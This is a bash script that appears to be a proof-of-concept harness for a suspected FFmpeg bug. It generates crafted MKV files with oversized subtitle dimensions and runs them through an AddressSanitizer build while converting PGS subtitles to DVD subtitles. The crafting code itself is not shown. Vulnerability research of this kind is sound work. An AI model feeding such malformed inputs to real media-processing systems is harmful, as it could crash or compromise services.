#!/bin/bash
set -uo pipefail
cd "$(dirname "$0")"
BIN=/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg

echo "[*] Generating crafted MKV files..."
python3 vuln_001_gen.py

echo ""
echo "=== Attempt 1: MKV with overflow dimensions (w=46341, h=46342) ==="
echo "    Expected: PGS decoder rejects due to av_image_check_size in ff_set_dimensions"
ASAN_OPTIONS="abort_on_error=0:log_path=./asan_overflow.log" \
  "$BIN" -y -v verbose -i vuln_001_input_overflow.mkv -c:s dvdsub -f vob /tmp/poc_out1.vob 2>&1 || true
cat asan_overflow.log.* 2>/dev/null || true

echo ""
echo "=== Attempt 2: MKV with valid-but-large dimensions (w=1025, h=2046) ==="
echo "    Expected: Reaches dvdsubenc size check -> 'dvd_subtitle too big'"
ASAN_OPTIONS="abort_on_error=0:log_path=./asan_valid.log" \
  "$BIN" -y -v verbose -i vuln_001_input_valid.mkv -c:s dvdsub -f vob /tmp/poc_out2.vob 2>&1 || true
cat asan_valid.log.* 2>/dev/null || true

echo ""
echo "=== Primary PoC run (attempt 2 as main input) ==="
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" \
  "$BIN" -y -i vuln_001_input.mkv -c:s dvdsub -f vob /tmp/poc_out_main.vob 2>&1 || true
cat asan.log.* 2>/dev/null || true
